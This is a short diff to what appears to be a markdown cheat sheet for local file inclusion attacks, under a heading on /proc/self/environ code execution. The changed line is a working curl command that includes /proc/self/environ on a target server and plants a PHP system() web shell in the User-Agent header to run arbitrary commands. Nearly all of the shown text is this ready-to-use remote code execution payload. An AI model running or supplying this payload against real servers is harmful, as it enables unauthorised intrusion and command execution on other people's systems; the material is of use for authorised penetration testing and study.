@@ -115,7 +115,7 @@ Compile phar with `php --define phar.readonly=0 create_path.php`
 ### /proc/self/environ code execution
 If environ file can be included User-Agent string can be used in order to achieve rce. Make sure User-Agent is inside /proc/self/environ for this to work.       
 
-`curl http://server/index.php?file=/proc/self/environ&cmd=id -H "User-Agent: <?php echo assert($_GET['cmd']);?>"`
+`curl http://server/index.php?file=/proc/self/environ&cmd=id -H "User-Agent: <?php echo system($_GET['cmd']);?>"`
 
 
 ### Lfimap
